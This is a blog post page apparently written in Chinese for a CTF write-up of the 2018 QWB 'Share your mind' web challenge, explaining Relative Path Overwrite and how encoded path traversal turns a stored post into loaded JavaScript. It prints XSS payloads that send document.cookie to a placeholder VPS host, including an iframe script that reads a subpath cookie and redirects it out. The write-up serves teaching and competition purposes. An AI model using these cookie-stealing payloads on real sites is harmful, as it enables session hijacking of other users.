@@ -1,0 +1,940 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="default">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web安全,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="PRO的全称为“Relative Path Overwrite”，也就是相对路径覆盖。利用浏览器和服务器对资源加载设置的差异，通过某些方法和技巧，在相对路径处，引入我们可控的js/css文件，甚至引入非js/css文件，并按照js/css的语法执行，从而实现攻击。 由题引入 1题目地址：http://39.107.33.96:20000/login.php 0x01 测试XSS大致思路：登陆进入后">
+<meta name="keywords" content="web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Share you mind writeup_RPO详解">
+<meta property="og:url" content="http://m3lon.github.io/2018/04/01/Share-you-mind-writeup-RPO详解/index.html">
+<meta property="og:site_name" content="m3lon">
+<meta property="og:description" content="PRO的全称为“Relative Path Overwrite”，也就是相对路径覆盖。利用浏览器和服务器对资源加载设置的差异，通过某些方法和技巧，在相对路径处，引入我们可控的js/css文件，甚至引入非js/css文件，并按照js/css的语法执行，从而实现攻击。 由题引入 1题目地址：http://39.107.33.96:20000/login.php 0x01 测试XSS大致思路：登陆进入后">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/01/Share-you-mind-writeup-RPO详解/Share-you-mind-writeup-RPO详解/r1.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/01/Share-you-mind-writeup-RPO详解/Share-you-mind-writeup-RPO详解/r2.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/01/Share-you-mind-writeup-RPO详解/Share-you-mind-writeup-RPO详解/r3.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/01/Share-you-mind-writeup-RPO详解/Share-you-mind-writeup-RPO详解/r6.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/01/Share-you-mind-writeup-RPO详解/Share-you-mind-writeup-RPO详解/r4.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/01/Share-you-mind-writeup-RPO详解/Share-you-mind-writeup-RPO详解/r5.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/01/Share-you-mind-writeup-RPO详解/Share-you-mind-writeup-RPO详解/r7.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/01/Share-you-mind-writeup-RPO详解/Share-you-mind-writeup-RPO详解/r8.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/01/Share-you-mind-writeup-RPO详解/Share-you-mind-writeup-RPO详解/r9.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/01/Share-you-mind-writeup-RPO详解/Share-you-mind-writeup-RPO详解/r10.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/01/Share-you-mind-writeup-RPO详解/Share-you-mind-writeup-RPO详解/r12.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/01/Share-you-mind-writeup-RPO详解/Share-you-mind-writeup-RPO详解/r11.png">
+<meta property="og:updated_time" content="2018-04-08T13:21:50.555Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Share you mind writeup_RPO详解">
+<meta name="twitter:description" content="PRO的全称为“Relative Path Overwrite”，也就是相对路径覆盖。利用浏览器和服务器对资源加载设置的差异，通过某些方法和技巧，在相对路径处，引入我们可控的js/css文件，甚至引入非js/css文件，并按照js/css的语法执行，从而实现攻击。 由题引入 1题目地址：http://39.107.33.96:20000/login.php 0x01 测试XSS大致思路：登陆进入后">
+<meta name="twitter:image" content="http://m3lon.github.io/2018/04/01/Share-you-mind-writeup-RPO详解/Share-you-mind-writeup-RPO详解/r1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://m3lon.github.io/2018/04/01/Share-you-mind-writeup-RPO详解/">
+
+
+
+
+
+  <title>Share you mind writeup_RPO详解 | m3lon</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-113184689-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+  <style>
+	blockquote {
+	  color: #888;
+	  background-color: #eae6f3;
+	  border-left: 1rem solid #5236a0;
+	  padding: 0 1.5rem;
+	  position: relative;
+	  font-family: 'Roboto', sans-serif;
+	}
+
+	blockquote:before,
+	blockquote:after {
+	  color: #392570;
+	  font-size: 2.5rem;
+	  position: absolute;
+	  line-height: 2.5rem;
+	}
+
+	blockquote:before {
+	  content: "\201C";
+	  left: -1rem;
+	  top: 0;
+	}
+
+	blockquote:after {
+	  content: "\201D";
+	  right: 0;
+	  bottom: -1rem;
+	}
+</style>
+</head>
+
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">m3lon</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://m3lon.github.io/2018/04/01/Share-you-mind-writeup-RPO详解/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="m3lon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/UMR.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m3lon">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Share you mind writeup_RPO详解</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-01T14:34:12+08:00">
+                2018-04-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-eye"></i> 浏览量
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>PRO的全称为“Relative Path Overwrite”，也就是相对路径覆盖。利用浏览器和服务器对资源加载设置的差异，通过某些方法和技巧，在相对路径处，引入我们可控的js/css文件，甚至引入非js/css文件，并按照js/css的语法执行，从而实现攻击。</p>
+<p>由题引入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目地址：http://39.107.33.96:20000/login.php</span><br></pre></td></tr></table></figure>
+<h4 id="0x01-测试XSS"><a href="#0x01-测试XSS" class="headerlink" title="0x01 测试XSS"></a>0x01 测试XSS</h4><p>大致思路：登陆进入后，</p>
+<ul>
+<li>url提交过去可能会有waf</li>
+<li>后台会有bot点击提交过去的url</li>
+<li>需要传过去自己VPS的地址得到cookie。</li>
+</ul>
+<p><img src="Share-you-mind-writeup-RPO详解/r1.png" alt=""></p>
+<p>测试waf:</p>
+<p>reports输入框中输入：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://VPSIP</span> &gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在自己的VPS的日志中确实可以看到访问记录，但是再利用直接加script脚本的方法无法获取到document.cookie</p>
+<p>所以这道题的关键在于寻找XSS注入点。今天的猪脚就要登场啦……</p>
+<h4 id="0x02-寻找XSS注入点-RPO"><a href="#0x02-寻找XSS注入点-RPO" class="headerlink" title="0x02 寻找XSS注入点_RPO"></a>0x02 寻找XSS注入点_RPO</h4><p>观察到url的形式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/2704</span><br></pre></td></tr></table></figure>
+<p>说明网站使用了<a href="https://www.kancloud.cn/manual/thinkphp/1697" target="_blank" rel="noopener">PATHINFO模式</a>，后面的参数依次为：<code>模块/控制器/操作</code></p>
+<p>再看html源码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"static/js/jquery.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;script src=<span class="string">"/static/js/bootstrap.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>使用了相对url引用css。</p>
+<p>于是猜测是相对路径覆盖攻击，开始测试，先操作再分析吧……</p>
+<p>先新建一篇文章，title为空，内容如下：</p>
+<p><img src="Share-you-mind-writeup-RPO详解/r2.png" alt=""></p>
+<p>接着进入新建的文章内容页，url输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/2715/..%2f..%2f..%2f..%2findex.php</span><br></pre></td></tr></table></figure>
+<p><img src="Share-you-mind-writeup-RPO详解/r3.png" alt=""></p>
+<p>接下来分析漏洞成因：服务端和客户端对url的解析不一致</p>
+<p>经过了一番折腾，大致形成了自己的思路，若有问题还请各位大佬指正……</p>
+<p>结合抓包进行分析，提交payload后可以抓到两个包</p>
+<p><img src="Share-you-mind-writeup-RPO详解/r6.png" alt=""></p>
+<p><strong>第一个包</strong></p>
+<p><img src="Share-you-mind-writeup-RPO详解/r4.png" alt=""></p>
+<p>服务器对url解码为：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/2715/../../../../index.php</span><br></pre></td></tr></table></figure>
+<p>于是往上跳三级目录执行index.php，于是服务器返回index.html页面，怀疑 <a href="http://39.107.33.96:20000/index.php/view/article/2715/../../../../" target="_blank" rel="noopener">http://39.107.33.96:20000/index.php/view/article/2715/../../../../</a> 是不是也可以成功弹框，经测试是没有问题的。</p>
+<p><strong>第二个包</strong></p>
+<p><img src="Share-you-mind-writeup-RPO详解/r5.png" alt=""></p>
+<p>这个包的产生源于刚才服务器返回的index.html中存在这样的相对路径引用</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"static/js/jquery.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>而浏览器发送的请求为什么是<code>/index.php/view/article/2715/static/js/jquery.min.js</code>呢？服务器为什么返回的又是/index.php/view/article/2715的内容呢？这就是RPO的漏洞根源所在了，狂敲小黑板！！重点来了！</p>
+<p>首先明确一点，我们的<code>static/js/jquery.min.js</code>相对的是index.php的目录 即网站根目录。</p>
+<p>接着看着我们的payload分析：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/2715/..%2f..%2f..%2f..%2findex.php</span><br></pre></td></tr></table></figure>
+<p>浏览器：并不会对%2f进行解析，认为..%2f..%2f..%2f..%2findex是一个脚本名字，<strong>浏览器在加载相对路径文件时是以最后一个/为相对目录加载具体资源文件的</strong>。于是认为此刻的目录是<code>http://39.107.33.96:20000/index.php/view/article/2715/</code>，所以请求相对路径的js资源时发送了<code>http://39.107.33.96:20000/index.php/view/article/2715/static/js/jquery.min.js</code></p>
+<p>服务器：接到上面浏览器的请求，服务器会按照PATHINFO模式来读取这个url，于是模块view/控制器article/操作2715/，后面的static/…会认为是参数了，然后后台并没有进行参数的接收，于是返回的是<code>http://39.107.33.96:20000/index.php/view/article/2715/</code>的内容alert(1),返回只html页面中</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"static/js/jquery.min.js"</span>&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>于是成功弹窗。</p>
+<h4 id="0x03-XSS利用"><a href="#0x03-XSS利用" class="headerlink" title="0x03 XSS利用"></a>0x03 XSS利用</h4><p>找到了XSS注入点，接下来的操作就水到渠成了</p>
+<p>payload:<code>(new Image()).src = &#39;http://VPSIP:Port?&#39;+document.cookie</code></p>
+<p>新建文章，content处出入payload，查看新生成的文章</p>
+<p><img src="Share-you-mind-writeup-RPO详解/r7.png" alt=""></p>
+<p>发现后台存在htmlspacialchars操作，可以用fromCharCode进行绕过处理 [<a href="http://www.cnblogs.com/TiestoRay/p/3564249.html" target="_blank" rel="noopener">js中字符串与Unicode 字符值序列的相互转换</a>]</p>
+<p><img src="Share-you-mind-writeup-RPO详解/r8.png" alt=""></p>
+<p>url输入<code>http://39.107.33.96:20000/index.php/view/article/2757/..%2f..%2f..%2f..%2findex.php</code></p>
+<p>查看服务器日志，咦，返回了自己的cookie，哈哈，傻了吧，肯定是要bot去点击啦，你自己点击当然是自己当前账户的cookie了 23333~~</p>
+<p><img src="Share-you-mind-writeup-RPO详解/r9.png" alt=""></p>
+<p>验证码的生成</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line">m= raw_input(<span class="string">"input m:"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s).hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9999999</span>):</span><br><span class="line">    <span class="keyword">if</span> md5(str(i)).startswith(m):</span><br><span class="line">        <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure>
+<p>提交之后，查看服务器日志</p>
+<p><img src="Share-you-mind-writeup-RPO详解/r10.png" alt=""></p>
+<p>根据提示，利用iframe跨域(这种跨域的方式最主要的是要求主域名相同)去读二级目录下的cookie</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i=<span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">i.src=<span class="string">"/QWB_fl4g/QWB/"</span>;</span><br><span class="line">i.id=<span class="string">"a"</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(i);</span><br><span class="line">i.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">  	<span class="keyword">var</span> c=<span class="built_in">document</span>.getElementById(<span class="string">'a'</span>).contentWindow.document.cookie;</span><br><span class="line">	location.href=<span class="string">"http://xxxxx?xx="</span>+c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后转换为Unicode序列值</p>
+<p><img src="Share-you-mind-writeup-RPO详解/r12.png" alt="">reports页面提交，查看服务器日志</p>
+<p><img src="Share-you-mind-writeup-RPO详解/r11.png" alt=""></p>
+<p>flag: QWB{flag_is_f43kth4rpo}</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>利用服务端和客户端对于<code>%2f</code>处理的不同完成了目录的穿越，如果这个时候在传入某个(某几个)paramx的时候会有我们能够完全控制的页面，那么我们就可以通过上述的方式进行目录穿越从而实现加载可控的js。</p>
+<p>RPO攻击生效条件</p>
+<ul>
+<li>浏览器的渲染模式：<a href="https://www.jianshu.com/p/dcab7cde8c04" target="_blank" rel="noopener">怪异模式</a> (即html文档开头没有DOCTYPE的声明) 。在怪异模式下，浏览器将会忽视其中<code>Content-Type: text/html</code>等声明文档类型的描述，将其中的任何css解析执行；反之如果是位于标准模式的话，浏览器将只会解析<code>Content-Type: text/css</code>,而其余则会报错。</li>
+<li>相对路径引用CSS</li>
+<li>可控的js (针对上述的CTF题目，即为<code>http://39.107.33.96:20000/index.php/view/article/2715/</code>的页面内容) </li>
+</ul>
+<p>参考：</p>
+<p><a href="https://paper.tuisec.win/detail/bc9d4cf9fb640a8" target="_blank" rel="noopener">深入剖析RPO漏洞</a></p>
+<p><a href="https://lorexxar.cn/2018/03/26/qwb2018/" target="_blank" rel="noopener">强网杯2018 Web writeup</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="m3lon WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web安全/" rel="tag"># web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/31/划水之强网杯2018writeup/" rel="next" title="划水之强网杯2018writeup">
+                <i class="fa fa-chevron-left"></i> 划水之强网杯2018writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/04/02/各类SQL注入payload/" rel="prev" title="各类SQL注入payload">
+                各类SQL注入payload <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMzYxOC8xMDE3Mw=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/UMR.png" alt="m3lon">
+            
+              <p class="site-author-name" itemprop="name">m3lon</p>
+              <p class="site-description motion-element" itemprop="description">欢迎各位大佬莅临 Hacked By LambdaX...</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/CTF/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://d4rkd0g.github.io" title="Lambda" target="_blank">Lambda</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-测试XSS"><span class="nav-number">1.</span> <span class="nav-text">0x01 测试XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-寻找XSS注入点-RPO"><span class="nav-number">2.</span> <span class="nav-text">0x02 寻找XSS注入点_RPO</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-XSS利用"><span class="nav-number">3.</span> <span class="nav-text">0x03 XSS利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">m3lon</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
